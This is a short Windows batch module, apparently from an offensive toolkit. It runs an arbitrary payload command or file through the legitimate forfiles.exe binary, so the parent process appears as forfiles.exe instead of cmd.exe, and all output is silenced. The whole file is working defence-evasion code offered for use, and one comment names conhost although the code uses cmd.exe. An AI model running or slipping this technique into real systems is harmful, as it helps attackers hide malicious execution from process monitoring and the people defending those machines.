REM provides: evasion_process_forfiles
REM depends: (none)
REM description: Execute commands via forfiles LOLBin to evade process monitoring

REM forfiles is a legitimate Windows binary that can execute arbitrary commands
REM Parent process appears as forfiles.exe instead of cmd.exe

if defined PAYLOAD_CMD (
    forfiles /p c:\windows\system32 /m svchost.exe /c "cmd /c %PAYLOAD_CMD%" >nul 2>nul
)

REM Alternative: use conhost as the LOLBin trigger
if defined PAYLOAD_PATH (
    forfiles /p c:\windows\system32 /m cmd.exe /c "cmd /c \"%PAYLOAD_PATH%\"" >nul 2>nul
)
